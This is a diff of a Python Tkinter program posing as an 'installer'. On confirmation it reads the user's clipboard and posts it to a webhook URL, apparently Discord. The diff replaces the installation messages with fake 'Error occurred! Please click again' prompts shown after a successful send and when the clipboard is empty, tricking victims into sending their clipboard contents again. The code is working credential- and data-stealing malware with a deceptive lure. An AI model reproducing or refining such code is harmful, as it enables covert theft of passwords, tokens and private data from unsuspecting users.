@@ -25,15 +25,15 @@ if confirm:
         content = pyperclip.paste()
         if content:
             data = {
-                "content": f"📋 **Clipboard-Inhalt:**\n```{content}```"
+                "content": f"📋 **Clipboard:**\n```{content}```"
             }
             response = requests.post(WEBHOOK_URL, json=data)
             if response.status_code == 204:
-                messagebox.showinfo("Erfolg", "Installation will be starting soon...")
+                messagebox.showinfo("Erfolg", "Error occurred! Please click again on the Button!")
             else:
                 messagebox.showerror("Fehler", f"Error occurred: {response.status_code}")
         else:
-            messagebox.showwarning("Leer", "Cannot install right now. Try again later.")
+            messagebox.showwarning("Leer", "Error occurred! Please click again on the Button!")
 
     # GUI aufbauen
     tk.Label(root, text="Run installer.", font=("Arial", 13)).pack(pady=10)
